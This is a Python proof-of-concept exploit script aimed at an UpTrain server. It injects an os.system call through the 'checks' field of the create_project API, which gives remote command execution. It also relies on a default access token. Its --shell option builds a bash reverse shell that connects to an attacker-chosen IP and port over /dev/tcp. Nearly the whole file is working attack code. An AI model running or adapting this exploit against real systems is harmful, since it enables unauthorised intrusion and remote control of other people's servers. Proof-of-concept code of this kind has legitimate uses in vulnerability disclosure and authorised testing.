#!/usr/bin/env python3

import argparse
import requests

def execute_command(url, command, access_token):
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en',
        'Connection': 'keep-alive',
        'Origin': 'http://localhost:3000',
        'Referer': 'http://localhost:3000/',
        'uptrain-access-token': access_token
    }

    data = {
        'model': 'gpt-3.5-turbo',
        'project_name': 'zeropath',
        'checks': f'__import__(\'os\').system(\'{command}\')',
        'dataset_name': 'zeropath',
        'metadata': '{"gpt-3.5-turbo":{"openai_api_key":"dummy_key"}}'
    }
    print(f"[*] Generated payload: {data['checks']}")
    files = {
        'data_file': ('test.jsonl', '', 'application/octet-stream')
    }

    response = requests.post(url + "/api/public/create_project", headers=headers, data=data, files=files)
    return response.status_code, response.text

def main():
    parser = argparse.ArgumentParser(description='UpTrain Exploit PoC')
    parser.add_argument('--url', required=True, help='UpTrain URL')
    parser.add_argument('--cmd', help='Command to execute')
    parser.add_argument('--shell', nargs=2, metavar=('IP', 'PORT'), help='Reverse shell IP and port')
    parser.add_argument('--token', default='default_key', help='UpTrain access token (default: default_key)')

    args = parser.parse_args()

    if not args.cmd and not args.shell:
        parser.error("Either --cmd or --shell must be provided")

    if args.shell:
        command = f"bash -c \"bash -i >& /dev/tcp/{args.shell[0]}/{args.shell[1]} 0>&1\" &"
    else:
        command = args.cmd

    print("[!] UpTrain Exploit PoC")
    print(f"[*] Target URL: {args.url}")
    print(f"[*] Executing command: {command}")
    print(f"[*] Using access token: {args.token}")

    status_code, response_text = execute_command(args.url, command, args.token)
    
    if status_code == 500:
        print("[+] Command executed successfully!")
    else:
        print("[-] Command execution failed.")

if __name__ == "__main__":
    main()